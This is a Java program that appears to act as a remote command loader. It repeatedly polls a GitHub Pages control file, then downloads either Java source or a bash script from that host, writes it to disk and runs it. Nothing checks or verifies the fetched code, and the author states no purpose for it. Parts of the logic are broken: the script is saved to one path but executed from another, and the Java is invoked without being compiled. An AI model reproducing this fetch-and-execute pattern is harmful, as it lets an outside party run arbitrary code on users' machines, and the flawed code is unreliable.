/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package init;
import java.awt.Desktop;
import java.io.BufferedReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Scanner;
import java.util.concurrent.TimeUnit;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.JOptionPane;

/**
 *
 * @author penguinlips
 */
public class Jv1 {
    
    

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) throws MalformedURLException, IOException, InterruptedException {
        
    String i = null, j = null;
        
    while(true){

        try {
                if (Desktop.isDesktopSupported() && Desktop.getDesktop().isSupported(Desktop.Action.BROWSE)) {
                    URL newurl = new URL("https://penguinlips.github.io/updates/test/main.txt");
                    try (BufferedReader br = new BufferedReader(new InputStreamReader(newurl.openStream()))) {

                        String line;

                        StringBuilder sb = new StringBuilder();

                        while ((line = br.readLine()) != null) {

                            sb.append(line);
                            sb.append(System.lineSeparator());
                        }

                        String str = sb.toString();
                        String[] strParts = str.split( "," );
                        i = strParts[0].toString();
                        j = strParts[1].toString();
                        
                    }
                }


            if("1".equals(j)){
                
                if (Desktop.isDesktopSupported() && Desktop.getDesktop().isSupported(Desktop.Action.BROWSE)) {
                    URL newurl = new URL("https://penguinlips.github.io/updates/test/java.txt");
                    try (BufferedReader br = new BufferedReader(new InputStreamReader(newurl.openStream()))) {

                        String line;

                        StringBuilder sb = new StringBuilder();

                        while ((line = br.readLine()) != null) {

                            sb.append(line);
                            sb.append(System.lineSeparator());
                        }

                        String str = sb.toString();
                        

                            FileWriter myWriter = new FileWriter("src/init/J1.java");
                            myWriter.write(str);
                            myWriter.close();
                            System.out.println("writing java");
                            J1.main(new String[0]);
  
                    }

                    
                }

                }else if("0".equals(j)){
                    
                    if (Desktop.isDesktopSupported() && Desktop.getDesktop().isSupported(Desktop.Action.BROWSE)) {
                    URL newurl = new URL("https://penguinlips.github.io/updates/test/bash.txt");
                    try (BufferedReader br = new BufferedReader(new InputStreamReader(newurl.openStream()))) {

                        String line;

                        StringBuilder sb = new StringBuilder();

                        while ((line = br.readLine()) != null) {

                            sb.append(line);
                            sb.append(System.lineSeparator());
                        }

                        String str = sb.toString();
                        

                            FileWriter myWriter = new FileWriter("src/init/sh.sh");
                            myWriter.write(str);
                            myWriter.close();
                            System.out.println("writing bash");
                            
                            
                            Process p;
                            try {
                             String[] cmd = { "sh", "sh.sh"};
                             p = Runtime.getRuntime().exec(cmd); 
                             p.waitFor(); 
                             BufferedReader reader=new BufferedReader(new InputStreamReader(
                              p.getInputStream())); 
                             String shline; 
                             while((shline = reader.readLine()) != null) { 
                              System.out.println(shline);
                             } 
                            } catch (IOException e) {
                             // TODO Auto-generated catch block
                             e.printStackTrace();
                            } catch (InterruptedException e) {
                             // TODO Auto-generated catch block
                             e.printStackTrace();
                            }
                           }
                    
                    }
                }
            
            
            
            
            
            
                while (true){

                try {

                TimeUnit.SECONDS.sleep(3);
                System.out.println("yup");
                
        
                } catch (InterruptedException ex) {
                    Logger.getLogger(Jv1.class.getName()).log(Level.SEVERE, null, ex);
                }
                
                }
        
        } catch (IOException ex) {
            System.out.println("error");
            break;
        }
        }
    }
}